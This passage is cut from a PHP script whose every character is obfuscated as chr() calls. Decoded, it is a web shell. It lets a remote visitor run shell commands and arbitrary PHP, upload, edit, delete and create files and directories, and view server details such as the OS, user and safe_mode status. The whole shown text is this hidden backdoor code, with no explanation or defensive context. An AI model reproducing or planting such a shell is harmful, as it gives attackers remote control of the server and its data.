hr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(39).chr(46).chr(36).chr(100).chr(105).chr(114).chr(46).chr(39).chr(34).chr(62).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(101).chr(102).chr(105).chr(108).chr(101).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(39).chr(46).chr(36).chr(102).chr(105).chr(108).chr(101).chr(46).chr(39).chr(34).chr(62).chr(60).chr(98).chr(114).chr(62).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(115).chr(117).chr(98).chr(109).chr(105).chr(116).chr(62).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(33).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(115).chr(97).chr(118).chr(101).chr(39).chr(93).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(119).chr(114).chr(105).chr(116).chr(101).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(101).chr(102).chr(105).chr(108).chr(101).chr(39).chr(93).chr(44).chr(32).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(115).chr(97).chr(118).chr(101).chr(39).chr(93).chr(41).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(33).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(114).chr(101).chr(109).chr(111).chr(118).chr(101).chr(39).chr(93).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(111).chr(98).chr(106).chr(32).chr(61).chr(32).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(114).chr(101).chr(109).chr(111).chr(118).chr(101).chr(39).chr(93).chr(59).chr(13).chr(10).chr(64).chr(105).chr(115).chr(95).chr(100).chr(105).chr(114).chr(40).chr(36).chr(111).chr(98).chr(106).chr(41).chr(32).chr(63).chr(32).chr(36).chr(114).chr(101).chr(115).chr(32).chr(61).chr(32).chr(64).chr(114).chr(109).chr(100).chr(105).chr(114).chr(40).chr(36).chr(111).chr(98).chr(106).chr(41).chr(32).chr(58).chr(32).chr(36).chr(114).chr(101).chr(115).chr(32).chr(61).chr(32).chr(64).chr(117).chr(110).chr(108).chr(105).chr(110).chr(107).chr(40).chr(36).chr(111).chr(98).chr(106).chr(41).chr(59).chr(13).chr(10).chr(36).chr(114).chr(101).chr(115).chr(32).chr(63).chr(32).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(82).chr(101).chr(109).chr(111).chr(118).chr(101).chr(100).chr(32).chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115).chr(102).chr(117).chr(108).chr(108).chr(121).chr(39).chr(32).chr(58).chr(32).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(82).chr(101).chr(109).chr(111).chr(118).chr(105).chr(110).chr(103).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(33).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(33).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(110).chr(101).chr(119).chr(100).chr(105).chr(114).chr(39).chr(93).chr(41).chr(41).chr(123).chr(13).chr(10).chr(64).chr(109).chr(107).chr(100).chr(105).chr(114).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(110).chr(101).chr(119).chr(100).chr(105).chr(114).chr(39).chr(93).chr(41).chr(32).chr(63).chr(32).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(68).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100).chr(46).chr(39).chr(32).chr(58).chr(32).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(67).chr(111).chr(117).chr(108).chr(100).chr(32).chr(110).chr(111).chr(116).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(32).chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121).chr(33).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(33).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(110).chr(101).chr(119).chr(102).chr(105).chr(108).chr(101).chr(39).chr(93).chr(41).chr(41).chr(123).chr(13).chr(10).chr(64).chr(116).chr(111).chr(117).chr(99).chr(104).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(110).chr(101).chr(119).chr(102).chr(105).chr(108).chr(101).chr(39).chr(93).chr(41).chr(32).chr(63).chr(32).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(70).chr(105).chr(108).chr(101).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100).chr(46).chr(39).chr(32).chr(58).chr(32).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(67).chr(111).chr(117).chr(108).chr(100).chr(32).chr(110).chr(111).chr(116).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(32).chr(102).chr(105).chr(108).chr(101).chr(33).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(33).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(97).chr(108).chr(105).chr(97).chr(115).chr(39).chr(93).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(39).chr(97).chr(108).chr(105).chr(97).chr(115).chr(39).chr(93).chr(41).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(33).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(95).chr(70).chr(73).chr(76).chr(69).chr(83).chr(91).chr(39).chr(117).chr(102).chr(105).chr(108).chr(101).chr(39).chr(93).chr(91).chr(39).chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101).chr(39).chr(93).chr(41).chr(41).chr(123).chr(13).chr(10).chr(105).chr(102).chr(40).chr(33).chr(105).chr(115).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(95).chr(102).chr(105).chr(108).chr(101).chr(40).chr(36).chr(95).chr(70).chr(73).chr(76).chr(69).chr(83).chr(91).chr(39).chr(117).chr(102).chr(105).chr(108).chr(101).chr(39).chr(93).chr(91).chr(39).chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101).chr(39).chr(93).chr(41).chr(32).chr(124).chr(124).chr(32).chr(64).chr(33).chr(99).chr(111).chr(112).chr(121).chr(40).chr(36).chr(95).chr(70).chr(73).chr(76).chr(69).chr(83).chr(91).chr(39).chr(117).chr(102).chr(105).chr(108).chr(101).chr(39).chr(93).chr(91).chr(39).chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101).chr(39).chr(93).chr(44).chr(36).chr(100).chr(105).chr(114).chr(46).chr(99).chr(104).chr(114).chr(40).chr(52).chr(55).chr(41).chr(46).chr(36).chr(95).chr(70).chr(73).chr(76).chr(69).chr(83).chr(91).chr(39).chr(117).chr(102).chr(105).chr(108).chr(101).chr(39).chr(93).chr(91).chr(39).chr(110).chr(97).chr(109).chr(101).chr(39).chr(93).chr(41).chr(41).chr(32).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(67).chr(111).chr(117).chr(108).chr(100).chr(32).chr(110).chr(111).chr(116).chr(32).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(39).chr(59).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(32).chr(36).chr(111).chr(117).chr(116).chr(32).chr(61).chr(32).chr(39).chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(32).chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115).chr(102).chr(117).chr(108).chr(108).chr(121).chr(46).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(105).chr(102).chr(40).chr(33).chr(36).chr(115).chr(97).chr(102).chr(101).chr(95).chr(109).chr(111).chr(100).chr(101).chr(41).chr(32).chr(112).chr(114).chr(105).chr(110).chr(116).chr(60).chr(60).chr(60).chr(104).chr(101).chr(114).chr(101).chr(13).chr(10).chr(60).chr(116).chr(114).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(99).chr(109).chr(100).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(32).chr(99).chr(111).chr(108).chr(115).chr(112).chr(97).chr(110).chr(61).chr(56).chr(32).chr(110).chr(111).chr(119).chr(114).chr(97).chr(112).chr(62).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(116).chr(101).chr(120).chr(116).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(99).chr(109).chr(100).chr(32).chr(115).chr(105).chr(122).chr(101).chr(61).chr(57).chr(55).chr(62).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(122).chr(122).chr(122).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(123).chr(36).chr(122).chr(122).chr(122).chr(125).chr(34).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(114).chr(62).chr(13).chr(10).chr(104).chr(101).chr(114).chr(101).chr(59).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(60).chr(60).chr(60).chr(104).chr(101).chr(114).chr(101).chr(13).chr(10).chr(60).chr(116).chr(114).chr(62).chr(13).chr(10).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(112).chr(104).chr(112).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(32).chr(99).chr(111).chr(108).chr(115).chr(112).chr(97).chr(110).chr(61).chr(56).chr(62).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(116).chr(101).chr(120).chr(116).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(112).chr(104).chr(112).chr(32).chr(115).chr(105).chr(122).chr(101).chr(61).chr(57).chr(55).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(114).chr(62).chr(13).chr(10).chr(60).chr(116).chr(114).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(97).chr(99).chr(116).chr(105).chr(111).chr(110).chr(115).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(101).chr(100).chr(105).chr(116).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(116).chr(101).chr(120).chr(116).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(101).chr(100).chr(105).chr(116).chr(32).chr(115).chr(105).chr(122).chr(101).chr(61).chr(49).chr(52).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(114).chr(101).chr(109).chr(111).chr(118).chr(101).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(116).chr(101).chr(120).chr(116).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(114).chr(101).chr(109).chr(111).chr(118).chr(101).chr(32).chr(115).chr(105).chr(122).chr(101).chr(61).chr(49).chr(52).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(110).chr(101).chr(119).chr(95).chr(100).chr(105).chr(114).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(116).chr(101).chr(120).chr(116).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(110).chr(101).chr(119).chr(100).chr(105).chr(114).chr(32).chr(115).chr(105).chr(122).chr(101).chr(61).chr(49).chr(52).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(110).chr(101).chr(119).chr(95).chr(102).chr(105).chr(108).chr(101).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(116).chr(101).chr(120).chr(116).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(110).chr(101).chr(119).chr(102).chr(105).chr(108).chr(101).chr(32).chr(115).chr(105).chr(122).chr(101).chr(61).chr(49).chr(53).chr(62).chr(13).chr(10).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(114).chr(62).chr(13).chr(10).chr(104).chr(101).chr(114).chr(101).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(36).chr(97).chr(108).chr(105).chr(97).chr(115).chr(101).chr(115).chr(41).chr(123).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(60).chr(60).chr(60).chr(104).chr(101).chr(114).chr(101).chr(13).chr(10).chr(60).chr(116).chr(114).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(97).chr(108).chr(105).chr(97).chr(115).chr(101).chr(115).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(32).chr(99).chr(111).chr(108).chr(115).chr(112).chr(97).chr(110).chr(61).chr(56).chr(62).chr(13).chr(10).chr(60).chr(115).chr(101).chr(108).chr(101).chr(99).chr(116).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(97).chr(108).chr(105).chr(97).chr(115).chr(62).chr(13).chr(10).chr(104).chr(101).chr(114).chr(101).chr(59).chr(13).chr(10).chr(102).chr(111).chr(114).chr(101).chr(97).chr(99).chr(104).chr(40).chr(36).chr(97).chr(108).chr(105).chr(97).chr(115).chr(101).chr(115).chr(32).chr(97).chr(115).chr(32).chr(36).chr(107).chr(32).chr(61).chr(62).chr(32).chr(36).chr(118).chr(41).chr(123).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(32).chr(39).chr(60).chr(111).chr(112).chr(116).chr(105).chr(111).chr(110).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(39).chr(46).chr(36).chr(118).chr(46).chr(39).chr(34).chr(62).chr(39).chr(46).chr(36).chr(107).chr(46).chr(39).chr(60).chr(47).chr(111).chr(112).chr(116).chr(105).chr(111).chr(110).chr(62).chr(39).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(60).chr(60).chr(60).chr(104).chr(101).chr(114).chr(101).chr(13).chr(10).chr(13).chr(10).chr(60).chr(47).chr(115).chr(101).chr(108).chr(101).chr(99).chr(116).chr(62).chr(13).chr(10).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(115).chr(117).chr(98).chr(109).chr(105).chr(116).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(114).chr(62).chr(13).chr(10).chr(104).chr(101).chr(114).chr(101).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(112).chr(114).chr(105).chr(110).chr(116).chr(60).chr(60).chr(60).chr(104).chr(101).chr(114).chr(101).chr(13).chr(10).chr(60).chr(116).chr(114).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(100).chr(105).chr(114).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(32).chr(99).chr(111).chr(108).chr(115).chr(112).chr(97).chr(110).chr(61).chr(56).chr(62).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(116).chr(101).chr(120).chr(116).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(123).chr(36).chr(100).chr(105).chr(114).chr(125).chr(34).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(100).chr(105).chr(114).chr(32).chr(115).chr(105).chr(122).chr(101).chr(61).chr(57).chr(55).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(114).chr(62).chr(13).chr(10).chr(60).chr(47).chr(102).chr(111).chr(114).chr(109).chr(62).chr(13).chr(10).chr(13).chr(10).chr(60).chr(102).chr(111).chr(114).chr(109).chr(32).chr(109).chr(101).chr(116).chr(104).chr(111).chr(100).chr(61).chr(112).chr(111).chr(115).chr(116).chr(32).chr(101).chr(110).chr(99).chr(116).chr(121).chr(112).chr(101).chr(61).chr(109).chr(117).chr(108).chr(116).chr(105).chr(112).chr(97).chr(114).chr(116).chr(47).chr(102).chr(111).chr(114).chr(109).chr(45).chr(100).chr(97).chr(116).chr(97).chr(62).chr(13).chr(10).chr(13).chr(10).chr(60).chr(116).chr(114).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(62).chr(13).chr(10).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(32).chr(99).chr(111).chr(108).chr(115).chr(112).chr(97).chr(110).chr(61).chr(56).chr(62).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(102).chr(105).chr(108).chr(101).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(117).chr(102).chr(105).chr(108).chr(101).chr(32).chr(115).chr(105).chr(122).chr(101).chr(61).chr(54).chr(48).chr(62).chr(38).chr(110).chr(98).chr(115).chr(112).chr(59).chr(38).chr(110).chr(98).chr(115).chr(112).chr(59).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(115).chr(117).chr(98).chr(109).chr(105).chr(116).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(34).chr(62).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(100).chr(105).chr(114).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(123).chr(36).chr(100).chr(105).chr(114).chr(125).chr(34).chr(62).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(122).chr(122).chr(122).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(123).chr(36).chr(122).chr(122).chr(122).chr(125).chr(34).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(114).chr(62).chr(13).chr(10).chr(60).chr(47).chr(102).chr(111).chr(114).chr(109).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(97).chr(98).chr(108).chr(101).chr(62).chr(13).chr(10).chr(13).chr(10).chr(60).chr(116).chr(97).chr(98).chr(108).chr(101).chr(32).chr(99).chr(101).chr(108).chr(108).chr(112).chr(97).chr(100).chr(100).chr(105).chr(110).chr(103).chr(61).chr(48).chr(32).chr(99).chr(101).chr(108).chr(108).chr(115).chr(112).chr(97).chr(99).chr(105).chr(110).chr(103).chr(61).chr(48).chr(32).chr(98).chr(111).chr(114).chr(100).chr(101).chr(114).chr(61).chr(49).chr(32).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(54).chr(53).chr(48).chr(62).chr(13).chr(10).chr(60).chr(102).chr(111).chr(114).chr(109).chr(32).chr(109).chr(101).chr(116).chr(104).chr(111).chr(100).chr(61).chr(112).chr(111).chr(115).chr(116).chr(62).chr(13).chr(10).chr(60).chr(116).chr(114).chr(32).chr(118).chr(97).chr(108).chr(105).chr(103).chr(110).chr(61).chr(116).chr(111).chr(112).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(32).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(55).chr(48).chr(37).chr(32).chr(98).chr(103).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(35).chr(100).chr(100).chr(100).chr(100).chr(100).chr(100).chr(62).chr(13).chr(10).chr(13).chr(10).chr(60).chr(98).chr(62).chr(79).chr(83).chr(58).chr(60).chr(47).chr(98).chr(62).chr(32).chr(123).chr(36).chr(111).chr(115).chr(95).chr(110).chr(97).chr(109).chr(101).chr(125).chr(60).chr(98).chr(114).chr(62).chr(13).chr(10).chr(60).chr(98).chr(62).chr(85).chr(115).chr(101).chr(114).chr(58).chr(60).chr(47).chr(98).chr(62).chr(32).chr(123).chr(36).chr(117).chr(115).chr(101).chr(114).chr(125).chr(60).chr(98).chr(114).chr(62).chr(13).chr(10).chr(60).chr(98).chr(62).chr(83).chr(101).chr(114).chr(118).chr(101).chr(114).chr(58).chr(60).chr(47).chr(98).chr(62).chr(32).chr(123).chr(36).chr(115).chr(101).chr(114).chr(118).chr(101).chr(114).chr(125).chr(60).chr(98).chr(114).chr(62).chr(13).chr(10).chr(60).chr(98).chr(62).chr(115).chr(97).chr(102).chr(101).chr(95).chr(109).chr(111).chr(100).chr(101).chr(58).chr(60).chr(47).chr(98).chr(62).chr(32).chr(123).chr(36).chr(115).chr(97).chr(102).chr(101).chr(125).chr(32).chr(60).chr(98).chr(62).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(58).chr(60).chr(47).chr(98).chr(62).chr(32).chr(123).chr(36).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(101).chr(125).chr(32).chr(60).chr(98).chr(62).chr(109).chr(97).chr(120).chr(95).chr(101).chr(120).chr(101).chr(99).chr(117).chr(116).chr(105).chr(111).chr(110).chr(95).chr(116).chr(105).chr(109).chr(101).chr(58).chr(60).chr(47).chr(98).chr(62).chr(32).chr(123).chr(36).chr(108).chr(105).chr(109).chr(105).chr(116).chr(125).chr(13).chr(10).chr(13).chr(10).chr(60).chr(105).chr(110).chr(112).chr(117).chr(116).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(122).chr(122).chr(122).chr(32).chr(118).chr(97).chr(108).chr(117).chr(101).chr(61).chr(34).chr(123).chr(36).chr(122).chr(122).chr(122).chr(125).chr(34).chr(62).chr(13).chr(10).chr(60).chr(47).chr(116).chr(100).chr(62).chr(13).chr(10).chr(60).chr(116).chr(100).chr(32).chr(114).chr(111).chr(119).chr(115).chr(112).chr(97).chr(110).chr(61).chr(50).chr(32).chr(98).chr(103).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(35).chr(100).chr(100).chr(100).chr(100).chr(100).chr(100).chr(62).chr(13).chr(10).chr(104).chr(101).chr(114).chr(101).chr(59).chr(13).chr(10).chr(13).chr(10).chr(105).chr(102).chr(40).chr(36).chr(100).chr(112).chr(32).chr(61).chr(32).chr(64).chr(111).chr(112).chr(101).chr(110).chr(68).chr(105).chr(114).chr(40).chr(36).chr(100).chr(105).chr(114).chr(41).chr(41).chr(123).chr(13).chr(10).chr(36).chr(99).chr(79).chr(98).chr(106).chr(32).chr(61).chr(32).chr(114).chr(101).chr(97).chr(100).chr(68).chr(105).chr(114).chr(40).chr(36).chr(100).chr(112).chr(41).chr(59).chr(13).chr(10).chr(119).chr(104).chr(105).chr(108).chr(101).chr(40).chr(36).chr(99).chr(79).chr(98).chr(106).chr(41).chr(123).chr(13).chr(10).chr(105).chr(102).chr(40).chr(64).chr(105).chr(115).chr(95).chr(100).chr(105).chr(114).chr(40).chr(36).chr(99).chr(79).chr(98).chr(106).chr(41).chr(41).chr(32).chr(36).chr(116).chr(104).chr(101).chr(68).chr(105).chr(114).chr(115).chr(91).chr(93).chr(32).chr(61).chr(32).chr(36).chr(99).chr(79).chr(98).chr(106).chr(59).chr(13).chr(10).chr(101).chr(108).chr(115).chr(101).chr(105).chr(102).chr(40).chr(64).chr(105).chr(115).chr(95).chr(102).chr(105).chr(108).chr(101).chr(40).chr(36).chr(99).chr(79).chr(98).chr(106).chr(41).chr(41).chr(32).chr(36).chr(116).chr(104).chr(101).chr(70).chr(105).chr(108).chr(101).chr(115).chr(91).chr(93).chr(32).chr(61).chr(32).chr(36).chr(99).chr(79).chr(98).chr(106).chr(59).chr(13).chr(10).chr(36).chr(99).chr(79).chr(98).chr(106).chr(32).chr(61).chr(32).chr(114).chr(101).chr(97).chr(100).chr(68).chr(105).chr(114).chr(40).chr(36).chr(100).chr(112).chr(41).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(99).chr(108).chr(111).chr(115).chr(101).chr(100).chr(105).chr(114).chr(40).chr(36).chr(100).chr(112).chr(41).chr(59).chr(13).chr(10).chr(125).chr(13).chr(10).chr(13).chr(10).chr(105).chr(102).chr(40).chr(33).chr(101).chr(109).chr(112).chr(116).chr(121).chr(40).chr(36).chr(116).chr(104).chr(101).chr(68).chr(105).chr(114).chr(115).chr(41).chr(41).chr(123).chr(13).chr(10).chr(110).chr(97).chr(116).chr(99).chr(97).chr(115).chr(101).chr(115).chr(111).chr(114).chr(116).chr(40).chr(36).chr(116).chr(104).chr(101).chr(68).chr(105).chr(114).chr(115).chr(41).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(36).chr(111).chr(115).chr(95).chr(116).chr(121).chr(112).chr(101).chr(32).chr(61).chr(61).chr(32).chr(39).chr(110).chr(105).chr(120).chr(39).chr(41).chr(123).chr(13).chr(10).chr(102).chr(111).chr(114).chr(101).chr(97).chr(99).chr(104).chr(40).chr(36).chr(116).chr(104).chr(101).chr(68).chr(105).chr(114).chr(115).chr(32).chr(97).chr(115).chr(32).chr(36).chr(99).chr(68).chr(105).chr(114).chr(41).chr(123).chr(13).chr(10).chr(36).chr(99).chr(111).chr(108).chr(111).chr(114).chr(61).chr(39).chr(98).chr(108).chr(97).chr(99).chr(107).chr(39).chr(59).chr(13).chr(10).chr(105).chr(102).chr(40).chr(105).chr(115).chr(95).chr(119).chr(114)